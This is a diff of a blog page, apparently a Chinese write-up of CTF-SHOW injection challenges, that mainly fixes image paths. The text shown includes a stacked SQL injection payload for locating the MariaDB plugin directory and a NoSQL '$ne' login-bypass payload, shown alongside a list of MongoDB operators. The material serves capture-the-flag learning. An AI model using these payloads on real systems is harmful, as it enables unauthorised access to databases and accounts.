 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line"># 或者</span><br><span class="line">select @@plugin_dir</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904000757048.png" alt="image-20220904000757048" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000757048.png" alt="image-20220904000757048" style="zoom:50%;">
 
 <p>查询方式：利用<strong>堆叠注入</strong></p>
 <p><strong>payload:</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;;show variables like &#x27;%plugin%&#x27;; %23</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904001223713.png" alt="image-20220904001223713" style="zoom:50%;"></li>
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904001223713.png" alt="image-20220904001223713" style="zoom:50%;"></li>
 </ol>
 <p>查到plugin路径为：<code>/usr/lib/mariadb/plugin</code></p>
 <p>后面便是将文件写入进去，最后执行文件</p>
@@ -577,8 +602,8 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag在flag中</span><br><span class="line">gt : &gt;</span><br><span class="line">$lt : &lt;</span><br><span class="line">$gte: &gt;=</span><br><span class="line">$lte: &lt;=</span><br><span class="line">$ne : !=、&lt;&gt;</span><br><span class="line">$in : in</span><br><span class="line">$nin: not in</span><br><span class="line">$all: all </span><br><span class="line">$or:or</span><br><span class="line">$not: 反匹配(1.3.3及以上版本)</span><br><span class="line">$regex</span><br></pre></td></tr></table></figure>
 
 <p>传参点为id 无过滤</p>
-<p>![image-20220904094011826](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904094011826.png)</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904094042843.png" alt="image-20220904094042843" style="zoom:50%;">
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094011826.png" alt="image-20220904094011826"></p>
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094042843.png" alt="image-20220904094042843" style="zoom:50%;">
 
 <p>这里可以利用重演式攻击，通过传递数组的方式来进行注入</p>
 <p><strong>payload:</strong></p>
@@ -586,14 +611,14 @@
 
 <ol start="250">
 <li><p>NoSQL注入</p>
-<p>题面![image-20220904094728417](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904094728417.png)</p>
+<p>题面<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094728417.png" alt="image-20220904094728417"></p>
 </li>
 </ol>
 <p>返回逻辑，也就是登录成功即可爆出flag</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904094746919.png" alt="image-20220904094746919" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094746919.png" alt="image-20220904094746919" style="zoom:50%;">
 
 <p>POST传参，参数点为username和password</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904094832405.png" alt="image-20220904094832405" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904094832405.png" alt="image-20220904094832405" style="zoom:50%;">
 
 <p>和上题的思路一致，（就是那个执行语句比较抽象），重演式注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]=&amp;password[$ne]=</span><br></pre></td></tr></table></figure>
@@ -601,7 +626,7 @@
 <ol start="251">
 <li><p>NoSQL注入</p>
 <p>这题的题面和上一关没有变化，注入进去后并没有爆出flag </p>
-<p>![image-20220904095426729](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904095426729.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095426729.png" alt="image-20220904095426729"></p>
 </li>
 </ol>
 <p>离谱，说明这题是不想让我们以admin用户名登录进去</p>
@@ -610,7 +635,7 @@
 <ol start="252">
 <li><p>NoSQL注入</p>
 <p>可以看到题面发生了变化</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904095754985.png" alt="image-20220904095754985" style="zoom:50%;"></li>
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904095754985.png" alt="image-20220904095754985" style="zoom:50%;"></li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongodb的find().pretty()方法的作用。</span><br><span class="line">使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑</span><br></pre></td></tr></table></figure>
 
